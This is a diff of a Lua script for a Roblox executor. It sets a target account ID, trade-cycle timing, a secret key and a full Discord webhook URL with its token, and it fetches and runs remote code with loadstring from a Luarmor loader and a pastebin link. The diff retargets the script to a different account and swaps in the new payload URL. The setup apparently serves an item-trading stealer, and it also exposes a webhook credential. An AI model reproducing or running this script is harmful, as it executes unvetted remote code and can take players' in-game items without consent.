@@ -1,5 +1,5 @@
 getgenv().SECRET_KEY = "mrr_8bafa27f91574620aa29c3af4ea50072"
-getgenv().TARGET_ID = 10613463491
+getgenv().TARGET_ID = 3867695277
 getgenv().DELAY_STEP = 1      
 getgenv().TRADE_CYCLE_DELAY = 1 
 getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1487166008509599795/vJVEVfhevB5ig53ttlDYRSqQkPyquOTMISd4o3-IfYf6iSo5ssx7406HAOZkoFoDX1Uh"
@@ -82,5 +82,5 @@ task.spawn(function()
 loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
 end)
 task.spawn(function()
-loadstring(game:HttpGet("https://pastefy.app/ycPWHFdw/raw"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/ayUwumQ4"))()
 end)
